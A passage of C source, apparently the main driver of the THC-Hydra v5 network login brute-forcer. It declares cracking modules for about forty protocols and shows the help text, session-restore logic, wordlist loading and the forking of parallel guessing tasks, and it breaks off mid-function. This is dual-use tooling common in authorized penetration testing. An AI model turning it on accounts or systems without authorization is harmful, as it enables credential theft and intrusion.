/*
 * hydra v5.0 (c) 2001-2006 by van Hauser / THC <vh@thc.org>
 * http://www.thc.org
 *
 * Parallized network login hacker. Do only use for legal purposes.
 */

#ifdef NESSUS_PLUGIN
#include <includes.h>
#endif

#include "hydra.h"
#include "performance.h"

void hydra_kill_arm(int arm_no, int killit, int fail);
extern void service_telnet(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_ftp(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_pop3(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_vmauthd(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_imap(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_ldap2(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_ldap3(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_cisco(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_cisco_enable(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_vnc(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_socks5(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_rexec(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_rlogin(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_rsh(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_nntp(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_head(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_get(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_get_form(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_post_form(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_proxy(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_icq(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_pcnfs(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_smb(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_mysql(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_mssql(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_oracle_listener(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_cvs(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_snmp(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_smtpauth(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_teamspeak(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_pcanywhere(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_sip(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_pop3_ntlm(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_imap_ntlm(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_smtpauth_ntlm(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
extern void service_http_proxy_auth_ntlm(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#ifdef LIBPOSTGRES
extern void service_postgres(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#endif
#ifdef LIBOPENSSL
extern void service_smbnt(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#endif
#ifdef LIBSAPR3
extern void service_sapr3(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#endif
#ifdef LIBSSH
extern void service_ssh2(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#endif
#ifdef LIBSVN
extern void service_svn(unsigned long int ip, int sp, unsigned char options, char *miscptr, FILE * fp, int port);
#endif

/* ADD NEW SERVICES HERE */

#define SERVICES  "telnet ftp pop3[-ntlm]   imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco  cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5   rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere  teamspeak sip vmauthd"

/* ADD NEW SERVICES HERE */

#define MAXBUF      520
#define MAXLINESIZE ( ( MAXBUF / 2 ) - 4 )
#define MAXTASKS    255
#define MAXSERVERS  16
#define MAXFAIL     3
#define MAXENDWAIT  20
#define RESTOREFILE "./hydra.restore"

#define PROGRAM   "Hydra"
#define VERSION   "v5.4"
#define AUTHOR    "van Hauser / THC"
#define EMAIL     "<vh@thc.org>"
#define RESSOURCE "http://www.thc.org"

#define WAITTIME  30
#define TASKS     16

extern void hydra_tobase64(unsigned char *buf, int buflen, int bufsize);

/* some structure definitions */
typedef struct {
  pid_t pid;
  int sp[2];
  int target_no;
  char *current_login_ptr;
  char *current_pass_ptr;
  int active;
  int redo;
  time_t last_seen;
} hydra_arm;

typedef struct {
  char *target;
  unsigned long int ip;
  char *login_ptr;
  char *pass_ptr;
  unsigned long int login_no;
  unsigned long int pass_no;
  unsigned long int sent;
  int pass_state;
  int use_count;
  int max_use_count;
  int done;                     /* 0 if active, 1 if finished scanning, 2 if error (for RESTOREFILE) */
  int fail_count;
} hydra_target;

typedef struct {
  int active;                   /* active tasks of hydra_options.tasks */
  int targets;
  int finished;
  unsigned long int todo_all;
  unsigned long int todo;
  unsigned long int sent;
  unsigned long int found;
  size_t countlogin;
  size_t sizelogin;
  size_t countpass;
  size_t sizepass;
  FILE *ofp;
} hydra_brain;

typedef struct {
  int mode;
  /* valid modes:
     0 = -l -p
     1 = -l -P
     2 = -L -p
     3 = -L -P
     +16 if try_null_password
     +32 if try_password_same_as_login
     64 = -C
   */
  int ssl;
  int restore;
  int debug;                    /* is external - for restore */
  int verbose;                  /* is external - for restore */
  int showAttempt;
  int tasks;
  int try_null_password;
  int try_password_same_as_login;
  int exit_found;
  int max_use;
  char *login;
  char *loginfile;
  char *pass;
  char *passfile;
  char *outfile_ptr;
  char *infile_ptr;
  char *colonfile;
  int waittime;                 /* is external - for restore */
  unsigned int port;            /* is external - for restore */
  char *miscptr;
  char *server;
  char *service;
} hydra_option;

typedef struct {
  char *name;
  int port;
  int port_ssl;
} hydra_portlist;

/* external vars */
extern char HYDRA_EXIT[5];
extern int errno;
extern int debug;
extern int verbose;
extern int waittime;
extern int port;
extern int found;
extern int use_proxy;
extern int proxy_string_port;
extern unsigned long int proxy_string_ip;
extern char *proxy_authentication;
extern char *cmdlinetarget;

/* required global vars */
char *prg;
size_t size_of_data = -1;
int killed = 0;
int options = 0;
hydra_arm **hydra_arms = NULL;
hydra_target **hydra_targets = NULL;
hydra_option hydra_options;
hydra_brain hydra_brains;

/* moved for restore feature */
int process_restore = 1, dont_unlink;
char *login_ptr = NULL, *pass_ptr = "", *csv_ptr = NULL, *servers_ptr = NULL;
size_t countservers = 1, sizeservers = 0;
char empty_login[2] = "";

void
help()
{
  printf("%s %s [%s] (c) 2006 by %s %s\n\n"
         "Syntax: %s [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]\n"
         " [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]\n" " server service [OPT]\n", PROGRAM, VERSION, RESSOURCE, AUTHOR, EMAIL, prg);
  printf("\nOptions:\n" "  -R        restore a previous aborted/crashed session\n");
#ifdef LIBOPENSSL
  printf("  -S        connect via SSL\n");
#endif
  printf("  -s PORT   if the service is on a different default port, define it here\n"
         "  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE\n"
         "  -p PASS  or -P FILE try password PASS, or load several passwords from FILE\n"
         "  -e ns     additional checks, \"n\" for null password, \"s\" try login as pass\n"
         "  -C FILE   colon seperated \"login:pass\" format, instead of -L/-P options\n");
  printf("  -M FILE   server list for parallel attacks, one entry per line\n"
         "  -o FILE   write found login/password pairs to FILE instead of stdout\n"
         "  -f        exit after the first found login/password pair (per host if -M)\n"
         "  -t TASKS  run TASKS number of connects in parallel (default: %d)\n"
         "  -w TIME   defines the max wait time in seconds for responses (default: %d)\n", TASKS, WAITTIME);
  printf("  -v / -V   verbose mode / show login+pass combination for each attempt\n"
         "  server    the target server (use either this OR the -M option)\n"
         "  service   the service to crack. Supported protocols: %s\n"
         "  OPT       some service modules need special input (see README!)\n\n", SERVICES);
  printf("Use HYDRA_PROXY_HTTP/HYDRA_PROXY_CONNECT and HYDRA_PROXY_AUTH env for a proxy.\n"
         "%s is a tool to guess/crack valid login/password pairs - use allowed only\n"
         "for legal purposes! If used commercially, tool name, version and web address\n"
         "must be mentioned in the report. Find the newest version at %s\n", PROGRAM, RESSOURCE);
  exit(-1);
}

void
hydra_debug(int force, char *string)
{
  int i;

  if (!debug && !force)
    return;

  printf("[DEBUG] Code: %s   Time: %lu\n", string, (unsigned long int)time(NULL));
  printf("[DEBUG] Options: mode %d  ssl %d  restore %d  showAttempt %d  tasks %d  tnp %d  tpsal %d  exit_found %d  miscptr %s  service %s\n",
         hydra_options.mode, hydra_options.ssl, hydra_options.restore, hydra_options.showAttempt, hydra_options.tasks,
         hydra_options.try_null_password, hydra_options.try_password_same_as_login, hydra_options.exit_found,
         hydra_options.miscptr == NULL ? "(null)" : hydra_options.miscptr, hydra_options.service);
  printf("[DEBUG] Brains: active %d  targets %d  finished %d  todo_all %lu  todo %lu  sent %lu  found %lu  countlogin %lu  sizelogin %lu  countpass %lu  sizepass %lu\n",
         hydra_brains.active, hydra_brains.targets, hydra_brains.finished, hydra_brains.todo_all, hydra_brains.todo, hydra_brains.sent, hydra_brains.found,
         (unsigned long int) hydra_brains.countlogin, (unsigned long int) hydra_brains.sizelogin, (unsigned long int) hydra_brains.countpass,
         (unsigned long int) hydra_brains.sizepass);
  for (i = 0; i < hydra_brains.targets; i++)
    printf
      ("[DEBUG] Target %d - target %s  ip %lu  login_no %lu  pass_no %lu  sent %lu  pass_state %d  use_count %d  max_use_count %d  done %d  fail_count %d  login_ptr %s  pass_ptr %s\n",
       i, hydra_targets[i]->target == NULL ? "(null)" : hydra_targets[i]->target, hydra_targets[i]->ip, hydra_targets[i]->login_no, hydra_targets[i]->pass_no,
       hydra_targets[i]->sent, hydra_targets[i]->pass_state, hydra_targets[i]->use_count, hydra_targets[i]->max_use_count, hydra_targets[i]->done, hydra_targets[i]->fail_count,
       hydra_targets[i]->login_ptr == NULL ? "(null)" : hydra_targets[i]->login_ptr, hydra_targets[i]->pass_ptr == NULL ? "(null)" : hydra_targets[i]->pass_ptr);
  if (hydra_arms != NULL)
    for (i = 0; i < hydra_options.tasks; i++)
      printf("[DEBUG] Task %d - pid %d  active %d  redo %d  current_login_ptr %s  current_pass_ptr %s\n",
             i, hydra_arms[i]->pid, hydra_arms[i]->active, hydra_arms[i]->redo,
             hydra_arms[i]->current_login_ptr == NULL ? "(null)" : hydra_arms[i]->current_login_ptr,
             hydra_arms[i]->current_pass_ptr == NULL ? "(null)" : hydra_arms[i]->current_pass_ptr);
}

void
bail(char *text)
{
  fprintf(stderr, "Error: %s\n", text);
  exit(-1);
}

void
hydra_restore_write(int print_msg)
{
  FILE *f;
  hydra_brain brain;

  int i = 0, j;

  if (process_restore != 1)
    return;

  if ((f = fopen(RESTOREFILE, "w")) == NULL) {
    fprintf(stderr, "Error: Can not create restore file (%s) - \n", RESTOREFILE);
    perror("");
    process_restore = 0;
  } else if (verbose)
    printf("[VERBOSE] Writing restore file... ");

  i = 0;
  for (j = 0; j < hydra_brains.targets; j++)
    if (hydra_targets[j]->done != 1)
      i++;

  if (i) {
    fprintf(f, "%s\n", PROGRAM);
    if (print_msg && debug)
      for (j = 0; j < hydra_options.tasks; j++)
        if (hydra_targets[hydra_arms[j]->target_no]->done != 1 && hydra_arms[j]->current_login_ptr != NULL)
          printf("[DEBUG] we will miss the following combination: target %s  login \"%s\"  pass \"%s\"\n", hydra_targets[hydra_arms[j]->target_no]->target,
                 hydra_arms[j]->current_login_ptr, hydra_arms[j]->current_pass_ptr);
    memcpy(&brain, &hydra_brains, sizeof(hydra_brain));
    brain.targets = i;
    brain.ofp = NULL;
    brain.finished = brain.active = 0;
    fwrite(&brain, sizeof(hydra_brain), 1, f);
    fwrite(&hydra_options, sizeof(hydra_option), 1, f);
    if (hydra_options.outfile_ptr == NULL)
      fprintf(f, "\n");
    else
      fprintf(f, "%s\n", hydra_options.outfile_ptr);
    fprintf(f, "%s\n%s\n", hydra_options.miscptr, hydra_options.service);

/*
    fprintf(f, "%lu\n", (unsigned long int) countservers);
    fprintf(f, "%lu\n", (unsigned long int) sizeservers);
    fwrite(servers_ptr, sizeservers, 1, f);
*/
    fwrite(login_ptr, hydra_brains.sizelogin, 1, f);
    if (hydra_options.colonfile == NULL || hydra_options.colonfile == empty_login)
      fwrite(pass_ptr, hydra_brains.sizepass, 1, f);
    for (j = 0; j < hydra_brains.targets; j++)
      if (hydra_targets[j]->done != 1) {
        fwrite(hydra_targets[j], sizeof(hydra_target), 1, f);
        fprintf(f, "%s\n%d\n%d\n", hydra_targets[j]->target, hydra_targets[j]->login_ptr - login_ptr, hydra_targets[j]->pass_ptr - pass_ptr);
      }
    fprintf(f, "%s\n", PROGRAM);
  }

  fclose(f);
  if (verbose)
    printf("done\n");
  if (print_msg)
    printf("The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n");
  hydra_debug(0, "hydra_restore_write()");
}

void
hydra_restore_read()
{
  FILE *f;

  int j;
  char out[1024], *ptr;

  ptr = out;
  if ((f = fopen(RESTOREFILE, "r")) == NULL) {
    fprintf(stderr, "Error: restore file (%s) not found - ", RESTOREFILE);
    perror("");
    exit(-1);
  }

  fgets(out, sizeof(out), f);
  if (out[0] != 0 && out[strlen(out) - 1] == '\n')
    out[strlen(out) - 1] = 0;
  if (strcmp(out, PROGRAM) != 0) {
    fprintf(stderr, "Error: invalid restore file (begin)\n");
    exit(-1);
  }

  fread(&hydra_brains, sizeof(hydra_brain), 1, f);
  hydra_brains.ofp = stdout;
  fread(&hydra_options, sizeof(hydra_option), 1, f);
  hydra_options.restore = 1;
  verbose = hydra_options.verbose;
  debug = hydra_options.debug;
  waittime = hydra_options.waittime;
  port = hydra_options.port;
  fgets(out, sizeof(out), f);
  if (out[0] != 0 && out[strlen(out) - 1] == '\n')
    out[strlen(out) - 1] = 0;
  if (strlen(out) > 0) {
    hydra_options.outfile_ptr = malloc(strlen(out) + 1);
    strcpy(hydra_options.outfile_ptr, out);
  } else
    hydra_options.outfile_ptr = NULL;
  fgets(out, sizeof(out), f);
  if (out[0] != 0 && out[strlen(out) - 1] == '\n')
    out[strlen(out) - 1] = 0;
  hydra_options.miscptr = malloc(strlen(out) + 1);
  strcpy(hydra_options.miscptr, out);
  fgets(out, sizeof(out), f);
  if (out[0] != 0 && out[strlen(out) - 1] == '\n')
    out[strlen(out) - 1] = 0;
  hydra_options.service = malloc(strlen(out) + 1);
  strcpy(hydra_options.service, out);
  hydra_targets = malloc(hydra_brains.targets * sizeof(hydra_targets));
  login_ptr = malloc(hydra_brains.sizelogin);
  fread(login_ptr, hydra_brains.sizelogin, 1, f);
  if (hydra_options.mode != 64) {
    pass_ptr = malloc(hydra_brains.sizepass);
    fread(pass_ptr, hydra_brains.sizepass, 1, f);
  } else {                      /* colonfile mode */
    hydra_options.colonfile = empty_login;      /* dummy */
    pass_ptr = csv_ptr = login_ptr;
  }
  for (j = 0; j < hydra_brains.targets; j++) {
    hydra_targets[j] = malloc(sizeof(hydra_target));
    fread(hydra_targets[j], sizeof(hydra_target), 1, f);
    fgets(out, sizeof(out), f);
    if (out[0] != 0 && out[strlen(out) - 1] == '\n')
      out[strlen(out) - 1] = 0;
    hydra_targets[j]->target = malloc(strlen(out) + 1);
    strcpy(hydra_targets[j]->target, out);
    fgets(out, sizeof(out), f);
    hydra_targets[j]->login_ptr = login_ptr + atoi(out);
    fgets(out, sizeof(out), f);
    hydra_targets[j]->pass_ptr = pass_ptr + atoi(out);
    hydra_targets[j]->fail_count = 0;
    hydra_targets[j]->use_count = 0;
    if (hydra_targets[j]->max_use_count < 4)
      hydra_targets[j]->max_use_count = hydra_options.max_use;
  }
  fgets(out, sizeof(out), f);
  if (out[0] != 0 && out[strlen(out) - 1] == '\n')
    out[strlen(out) - 1] = 0;
  if (strcmp(out, PROGRAM) != 0) {
    fprintf(stderr, "Error: invalid restore file (end)\n");
    exit(-1);
  }
  fclose(f);
  hydra_debug(0, "hydra_restore_read");
}

void
killed_childs(int signo)
{
  int pid,i;
  killed++;
  pid = wait3(NULL, WNOHANG, NULL);
  for(i=0;i<hydra_options.tasks;i++)	  {
  	if(pid==hydra_arms[i]->pid)	{
  		hydra_kill_arm(i, 0, 0);
		return;
	}
  }
}

void
kill_children(int signo)
{
  int i;

  if (process_restore == 1)
    hydra_restore_write(1);
  if (hydra_arms != NULL) {
    for (i = 0; i < hydra_options.tasks; i++)
      if (hydra_arms[i] != NULL && hydra_arms[i]->pid > 0)
        kill(hydra_arms[i]->pid, SIGTERM);
    for (i = 0; i < hydra_options.tasks; i++)
      if (hydra_arms[i] != NULL && hydra_arms[i]->pid > 0)
        kill(hydra_arms[i]->pid, SIGKILL);
  }
  exit(0);
}

unsigned long int
countlines(FILE * fp, int colonmode)
{
  size_t lines = 0, size = 0;
  char *buf = malloc(MAXLINESIZE);
  int only_one_empty_line = 0;

  while (!feof(fp)) {
    if (fgets(buf, MAXLINESIZE, fp) != NULL) {
      if (buf[0] != 0) {
        if (buf[0] == '\r' || buf[0] == '\n') {
          if (only_one_empty_line == 0) {
            only_one_empty_line = 1;
            size += 1;
            lines++;
          }
        } else {
          size += strlen(buf);
          lines++;
        }
      }
      if (colonmode && buf[0] != 0) {
        if (buf[strlen(buf) - 1] == ':')
          size++;
        if (buf[0] == ':')
          size++;
      }
    }
  }
  rewind(fp);
  free(buf);
  size++;
  size_of_data = size;
  return lines;
}

void
fill_mem(char *ptr, FILE *fp, int colonmode)
{
  char tmp[MAXBUF + 4] = "";
  char *ptr2;
  int len;
  int only_one_empty_line = 0;

  while (!feof(fp)) {
    if (fgets(tmp, MAXLINESIZE, fp) != NULL) {
      if (tmp[0] != 0) {
        if (tmp[strlen(tmp) - 1] == '\n')
          tmp[strlen(tmp) - 1] = '\0';
        if (tmp[0] != 0 && tmp[strlen(tmp) - 1] == '\r')
          tmp[strlen(tmp) - 1] = '\0';
        if ((len = strlen(tmp)) > 0 || (only_one_empty_line == 0 && colonmode == 0)) {
          if (len == 0 && colonmode == 0) {
            only_one_empty_line = 1;
            len = 1;
          }
          tmp[len] = 0; /* ensure null byte at the end of the string */
          if (colonmode) {
            if ((ptr2 = index(tmp, ':')) == NULL) {
              fprintf(stderr, "Error: invalid line in colon file (-C), missing colon in line: %s\n", tmp);
              exit(-1);
            } else {
              if (tmp[0] == ':') {
                *ptr = 0;
                ptr++;
              }
              if (tmp[len - 1] == ':' && len > 1) {
                len++;
                tmp[len - 1] = 0;
              }
              *ptr2 = 0;
            }
          }
          memcpy(ptr, tmp, len);
          ptr += len;
          *ptr = '\0';
          ptr++;
        }
      }
    }
  }
  fclose(fp);
}

char *
hydra_build_time()
{
  static char datetime[24];
  struct tm *the_time;
  time_t epoch;

  time(&epoch);
  the_time = localtime(&epoch);
  strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", the_time);
  return (char *) &datetime;
}

int
hydra_spawn_arm(int arm_no, int target_no)
{
  int i;
 
  if (socketpair(PF_UNIX, SOCK_STREAM, 0, hydra_arms[arm_no]->sp) == 0) {
    if ((hydra_arms[arm_no]->pid = fork()) == 0) {      /* THIS IS THE CHILD */
      /* set new signals for child */
      signal(SIGCHLD, killed_childs);
      signal(SIGTERM, exit);
      signal(SIGSEGV, exit);
      signal(SIGHUP, exit);
      signal(SIGINT, exit);
      signal(SIGPIPE, exit);
      /* free structures to make memory available */
      process_restore = 0;
      for (i = 0; i < hydra_options.tasks; i++)
        if (i != arm_no)
          free(hydra_arms[i]);
      for (i = 0; i < countservers; i++)
        if (i != target_no)
          free(hydra_targets[i]);
      if (hydra_options.loginfile != NULL)
        free(login_ptr);
      if (hydra_options.passfile != NULL)
        free(pass_ptr);
      if (hydra_options.colonfile != NULL && hydra_options.colonfile != empty_login)
        free(csv_ptr);
      if (hydra_options.infile_ptr != NULL)
        free(servers_ptr);

      cmdlinetarget = hydra_targets[target_no]->target;

      /* now call crack module */
      if (strcmp(hydra_options.service, "telnet") == 0)
        service_telnet(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "ftp") == 0)
        service_ftp(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "pop3") == 0)
        service_pop3(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "imap") == 0)
        service_imap(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "pop3-ntlm") == 0)
        service_pop3_ntlm(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "imap-ntlm") == 0)
        service_imap_ntlm(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "vmauthd") == 0)
        service_vmauthd(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "ldap2") == 0)
        service_ldap2(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "ldap3") == 0)
        service_ldap3(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-head") == 0)
        service_http_head(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-get") == 0)
        service_http_get(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-get-form") == 0)
        service_http_get_form(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-post-form") == 0)
        service_http_post_form(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-proxy") == 0)
        service_http_proxy(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "http-proxy-ntlm") == 0)
        service_http_proxy_auth_ntlm(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "cisco") == 0)
        service_cisco(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "cisco-enable") == 0)
        service_cisco_enable(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "socks5") == 0)
        service_socks5(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "vnc") == 0)
        service_vnc(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "rexec") == 0)
        service_rexec(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "rlogin") == 0)
        service_rlogin(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "rsh") == 0)
        service_rsh(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "nntp") == 0)
        service_nntp(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "icq") == 0)
        service_icq(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "pcnfs") == 0)
        service_pcnfs(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "smb") == 0)
        service_smb(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "mysql") == 0)
        service_mysql(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "mssql") == 0)
        service_mssql(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "oracle-listener") == 0)
        service_oracle_listener(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#ifdef LIBPOSTGRES
      if (strcmp(hydra_options.service, "postgres") == 0)
        service_postgres(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#endif
if (strcmp(hydra_options.service, "pcanywhere") == 0)
        service_pcanywhere(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port); 
      if (strcmp(hydra_options.service, "csv") == 0)
        service_cvs(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#ifdef LIBSVN
      if (strcmp(hydra_options.service, "svn") == 0)
        service_svn(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#endif
      if (strcmp(hydra_options.service, "snmp") == 0)
        service_snmp(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#ifdef LIBOPENSSL
      if (strcmp(hydra_options.service, "smbnt") == 0)
        service_smbnt(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#endif
#ifdef LIBSAPR3
      if (strcmp(hydra_options.service, "sapr3") == 0)
        service_sapr3(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#endif
#ifdef LIBSSH
      if (strcmp(hydra_options.service, "ssh2") == 0)
        service_ssh2(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
#endif
      if (strcmp(hydra_options.service, "smtp-auth") == 0)
        service_smtpauth(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "smtp-auth-ntlm") == 0)
        service_smtpauth_ntlm(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
      if (strcmp(hydra_options.service, "teamspeak") == 0)
        service_teamspeak(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
            if (strcmp(hydra_options.service, "sip") == 0)
                service_sip(hydra_targets[target_no]->ip, hydra_arms[arm_no]->sp[1], options, hydra_options.miscptr, hydra_brains.ofp, port);
/* ADD NEW SERVICES HERE */

      /* just in case a module returns (which it shouldnt) we let it exit here */
      exit(0);
    } else {
      if (hydra_arms[arm_no]->pid > 0) {
        write(hydra_arms[arm_no]->sp[1], "n", 1);       /* yes, a small "n" - this way we can distinguish later if the client successfully tested a pair and is requesting a new one or the mother did that */
        fcntl(hydra_arms[arm_no]->sp[0], F_SETFL, O_NONBLOCK);
        hydra_arms[arm_no]->target_no = target_no;
        hydra_arms[arm_no]->active = 1;
        /* hydra_arms[arm_no]->fail_count = 0; */
        hydra_targets[target_no]->use_count++;
        hydra_brains.active++;
        hydra_arms[arm_no]->last_seen = time(NULL);
      } else {
        perror("Error: Fork for children failed");
        hydra_arms[arm_no]->sp[0] = -1;
